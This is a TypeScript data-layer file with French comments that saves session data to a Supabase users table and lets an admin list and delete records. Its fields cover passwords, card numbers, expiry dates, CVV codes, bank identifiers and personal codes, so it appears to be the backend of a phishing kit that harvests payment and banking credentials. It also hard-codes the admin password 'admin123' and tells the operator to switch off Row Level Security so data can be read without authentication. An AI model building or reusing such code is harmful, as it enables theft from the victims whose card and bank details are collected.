import { getUserByEmail, upsertUser, getAllUsers as fetchAllUsers, deleteUserByEmail as deleteUser } from './supabaseClient';
import type { UserData } from './supabaseClient';

// Stocke les données utilisateur dans sessionStorage
export const saveToSession = (key: string, data: any): void => {
  try {
    sessionStorage.setItem(key, JSON.stringify(data));
  } catch (error) {
    console.error("Error saving to session:", error);
  }
};

// Récupère les données utilisateur depuis sessionStorage
export const getFromSession = (key: string): any => {
  try {
    const item = sessionStorage.getItem(key);
    return item ? JSON.parse(item) : null;
  } catch (error) {
    console.error("Error getting from session:", error);
    return null;
  }
};

// Met à jour les données de session utilisateur
export const updateUserSession = (userData: Partial<UserData>): void => {
  try {
    const currentData = getFromSession("userData") || {};
    const updatedData = { ...currentData, ...userData };
    saveToSession("userData", updatedData);
  } catch (error) {
    console.error("Error updating user session:", error);
  }
};

// Sauvegarde les données utilisateur dans Supabase
export const saveUserDataToJson = async (): Promise<any> => {
  try {
    const userData = getFromSession("userData");
    
    // Nous vérifions d'abord si l'utilisateur existe pour connaître le schéma exact
    if (!userData || !userData.email) {
      throw new Error("Données utilisateur ou email manquant");
    }
    
    try {
      // Récupérer l'utilisateur existant pour connaître le schéma
      const existingUser = await getUserByEmail(userData.email);
      console.log("Utilisateur existant:", existingUser);
      
      // Définir la conversion camelCase vers snake_case basée sur l'image de la structure de la table
      const fieldMapping: Record<string, string> = {
        'dateNaissance': 'datenaissance',
        'codePostal': 'codepostal',
        'numeroCarte': 'numerocarte',
        'dateExpiration': 'dateexpiration',
        'typeBanque': 'typebanque',
        'identifiantBancaire': 'identifiantbancaire',
        'codePersonnel': 'codepersonnel'
      };
      
      // Construire un objet qui ne contient que les champs présents dans la base de données
      let validUserData: any = { email: userData.email };
      
      // Liste des champs connus dans la table Supabase (d'après l'image)
      const knownFields = [
        'email', 'password', 'nom', 'prenom', 'datenaissance',
        'adresse', 'codepostal', 'ville', 'telephone',
        'numerocarte', 'dateexpiration', 'cryptogramme',
        'typebanque', 'identifiantbanque', 'codepersonnel',
        'montant', 'code'
      ];
      
      // Si l'utilisateur existe, nous utilisons ses champs comme modèle
      if (existingUser) {
        Object.keys(existingUser).forEach(key => {
          if (key !== 'id' && userData[key] !== undefined) {
            validUserData[key] = userData[key];
          } else {
            // Vérifier si nous avons une correspondance dans le mapping
            const camelCaseKey = Object.keys(fieldMapping).find(
              camelKey => fieldMapping[camelKey] === key
            );
            if (camelCaseKey && userData[camelCaseKey] !== undefined) {
              validUserData[key] = userData[camelCaseKey];
            }
          }
        });
      } else {
        // Si l'utilisateur n'existe pas, nous adaptons les champs selon le mapping
        Object.entries(userData).forEach(([key, value]) => {
          if (knownFields.includes(key)) {
            validUserData[key] = value;
          } else if (fieldMapping[key]) {
            // Si la clé a un équivalent dans notre mapping, utilisez-le
            validUserData[fieldMapping[key]] = value;
          }
        });
      }
      
      console.log("Données utilisateur filtrées et formatées:", validUserData);
      
      // Enregistrer dans Supabase
      const result = await upsertUser(validUserData);
      console.log("Résultat de upsertUser:", result);
      
      // Simule un délai pour l'enregistrement (peut être supprimé en production)
      await new Promise(resolve => setTimeout(resolve, 500));
      
      return result;
    } catch (error: any) {
      if (error.isRlsError) {
        console.error("Erreur RLS lors de la sauvegarde des données:", error);
        
        throw {
          message: "Erreur de sécurité: Row Level Security (RLS) empêche la sauvegarde des données",
          isRlsError: true,
          originalError: error,
          solution: error.solution || "Pour résoudre ce problème: Allez dans le dashboard Supabase, sélectionnez Authentication > Policies, puis désactivez RLS pour la table users ou créez une politique permettant l'écriture sans authentification."
        };
      }
      throw error;
    }
  } catch (error) {
    console.error("Error saving user data to Supabase:", error);
    throw error;
  }
};

// Récupère toutes les données utilisateurs depuis Supabase
export const getAllUsersData = async (): Promise<UserData[]> => {
  try {
    console.log("Tentative de récupération de tous les utilisateurs...");
    const users = await fetchAllUsers();
    console.log("Utilisateurs récupérés:", users.length);
    return users;
  } catch (error: any) {
    console.error("Error getting all users data:", error);
    if (error.isRlsError) {
      console.error("Erreur RLS lors de la récupération des données:", error);
      throw {
        message: "Erreur de sécurité: Row Level Security (RLS) empêche l'accès aux données",
        isRlsError: true,
        originalError: error,
        solution: error.solution || "Pour résoudre ce problème: Allez dans le dashboard Supabase, sélectionnez Authentication > Policies, puis désactivez RLS pour la table users ou créez une politique permettant la lecture sans authentification."
      };
    }
    return [];
  }
};

// Supprime un utilisateur par son email via Supabase
export const deleteUserByEmail = async (email: string): Promise<boolean> => {
  try {
    console.log("Tentative de suppression de l'utilisateur avec email:", email);
    await deleteUser(email);
    console.log("Utilisateur supprimé avec succès");
    return true;
  } catch (error: any) {
    console.error("Error deleting user:", error);
    if (error.isRlsError) {
      throw {
        message: "Erreur de sécurité: Row Level Security (RLS) empêche la suppression des données",
        isRlsError: true,
        originalError: error,
        solution: error.solution || "Pour résoudre ce problème: Allez dans le dashboard Supabase, sélectionnez Authentication > Policies, puis désactivez RLS pour la table users ou créez une politique permettant la suppression sans authentification."
      };
    }
    throw error;
  }
};

// Vérifie le mot de passe admin
export const checkAdminPassword = (password: string): boolean => {
  // Mot de passe en dur pour cet exemple
  return password === 'admin123';
};
